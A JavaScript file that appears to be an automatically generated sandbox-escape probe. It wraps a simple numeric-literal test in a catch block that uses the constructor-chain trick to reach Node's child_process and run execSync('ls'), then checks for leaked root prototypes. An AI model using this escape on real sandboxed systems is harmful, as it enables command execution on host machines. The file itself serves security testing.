try {
    if (0 !== 0) {
        $ERROR('#0: 0.0E0 === 0.0');
    }
    if (1.1 !== 1.1) {
        $ERROR('#1: 1.1E0 === 1.1');
    }
    if (2.2 !== 2.2) {
        $ERROR('#2: 2.2E0 === 2.2');
    }
    if (3.3 !== 3.3) {
        $ERROR('#3: 3.3E0 === 3.3');
    }
    if (4.4 !== 4.4) {
        $ERROR('#4: 4.4E0 === 4.4');
    }
    if (5.5 !== 5.5) {
        $ERROR('#5: 5.5E0 === 5.5');
    }
    if (6.6 !== 6.6) {
        $ERROR('#6: 6.E0 === 6.6');
    }
    if (7.7 !== 7.7) {
        $ERROR('#7: 7.7E0 === 7.7');
    }
    if (8.8 !== 8.8) {
        $ERROR('#8: 8.8E0 === 8.8');
    }
    if (9.9 !== 9.9) {
        $ERROR('#9: 9.9E0 === 9.9');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}